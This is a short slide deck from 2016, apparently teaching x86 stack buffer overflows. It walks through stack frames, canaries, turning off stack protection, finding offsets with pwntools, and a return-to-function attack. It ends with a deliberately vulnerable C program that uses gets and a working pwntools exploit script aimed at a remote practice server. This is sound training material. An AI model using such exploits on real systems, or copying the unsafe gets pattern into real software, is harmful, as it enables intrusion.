#Stack overflow

廖子慶  
2016/12/27 <!-- .element: align="right" -->

---

# Function call

--

## caller

```asm
push args
call foo //push $eip; jmp foo
```

| addr  | content  |
|  ---  |   ---    |
|  esp  | ret addr |
| esp+4 |   args   |

--

## callee 
```asm
push ebp
mov ebp,esp
sub esp,4
...
leave // mov esp,ebp ; pop ebp
ret // pop $eip
```

| addr  |  content  |
|  ---  |    ---    |
|  esp  | local var |
|  ...  |    ...    |
|  ebp  | old $ebp  |
| ebp+4 | ret addr  |
| ebp+8 |   args    |

---

# Memory

| addr  | content  |
|  ---  |   ---    |
|  esp  |   buf    |
|  ...  |   ...    |
|  ebp  | old $ebp |
| ebp+4 | ret addr |
| ebp+8 |   args   |

--

# Normal

| addr  | content  |
|  ---  |   ---    |
|  esp  |   AAAA   |
|  ...  |   ...    |
|  ebp  | old $ebp |
| ebp+4 | ret addr |
| ebp+8 |   args   |

--

# Overflow

| addr  | content |
|  ---  |   ---   |
|  esp  |  AAAA   |
|  ...  |   ...   |
|  ebp  |  AAAA   |
| ebp+4 |  AAAA   |
| ebp+8 |  args   |

--

# ret
# $EIP=0x41414141

---

# Canary

default is on

|  addr  |  content  |
|  ---   |    ---    |
|  esp   | local var |
|  ...   |    ...    |
| ebp-12 |  canry   |
|  ebp   | old $ebp  |
| ebp+4  | ret addr  |
| ebp+8  |   args    |

--

## Overflow

|  addr  | content |
|  ---   |   ---   |
|  esp   |  AAAA   |
|  ...   |   ...   |
| ebp-12 |  AAAA   |
|  ebp   |  AAAA   |
| ebp+4  |  AAAA   |
| ebp+8  |  args   |

```shell
*** stack smashing detected ***: ./a.out terminated  
Aborted
```

--

# Turn off

```shell
gcc -fno-stack-protector a.c
```

--

# But...

```shell
*** stack smashing detected ***: argv[0] terminated  
Aborted
```

## leak string

---

# Padding

```python
cyclic(100)
> 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

```gdb
Stopped reason: SIGSEGV
0x61616165 in ?? ()
```

```python
cyclic_find(p32(0x61616165))
> 16
```

---

# Return to function

```python
elf=ELF('./a.out') # load elf
foo=elf.symbols['foo'] # function foo location
# gdb info function
addr=p32(foo) # convert int to memory type
# 0x12345678 in memory is 78 56 34 12
payload="A"*padding+addr
```

--

# Memory

|  addr  | content |
|  ---   |   ---   |
|  esp   |  AAAA   |
|  ...   |   ...   |
|  ebp   |  AAAA   |
| ebp+4  |  addr   |
| ebp+8  |  args   |

--

# Demo

[easy overflow](https://drive.google.com/open?id=0B5w3KuqR3zoBcVZ4VC1Pcy1ZOGc)

```shell
nc vpn.duckll.tw 12345
```

```c
#include <stdio.h>
#include <stdlib.h>
void flag(){
    system("cat flag");
    return;
}
void vul(){
    char buf[4];
    gets(buf);
    return;
}
int main(int argc, char *argv[])
{
    vul();
    return 0;
}
```

--

# Answer

```python
from pwn import *
elf=ELF('./ez_of.out')
#  io=process('./a.out')
io=remote('vpn.duckll.tw',12345)
padding=16
payload="A"*padding+p32(elf.symbols['flag'])
print "payload",payload.encode('hex')
#  gdb.attach(io)
io.sendline(payload)
io.interactive()
```

---


#Q & A

--

#END

